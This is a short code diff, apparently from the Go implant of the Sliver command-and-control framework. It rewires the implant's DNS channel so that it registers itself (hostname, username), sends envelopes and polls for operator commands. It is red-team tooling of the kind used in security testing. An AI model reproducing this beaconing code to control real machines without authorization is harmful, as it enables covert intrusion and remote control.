@@ -149,15 +149,23 @@ func dnsConnect() error {
 
 	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool)
+	pollCtrl := make(chan bool)
 	defer func() {
-		ctrl <- true // Stop polling
+		pollCtrl <- true // Stop polling
 		close(send)
 		close(recv)
-		close(ctrl)
+		close(pollCtrl)
 	}()
 
-	go dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
+	go func() {
+		for envelope := range send {
+			go dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
+		}
+	}()
+
+	go dnsRegisterSliver(send)
+
+	go dnsSessionPoll(dnsParent, sessionID, sessionKey, pollCtrl, recv)
 
 	handlers := getSystemHandlers()
 	for envelope := range recv {
@@ -187,7 +195,7 @@ func getReconnectInterval() time.Duration {
 func getRegisterSliver() *pb.Envelope {
 	hostname, _ := os.Hostname()
 	currentUser, _ := user.Current()
-	data, _ := proto.Marshal(&pb.RegisterSliver{
+	data, _ := proto.Marshal(&pb.Register{
 		Name:     sliverName,
 		Hostname: hostname,
 		Username: currentUser.Username,
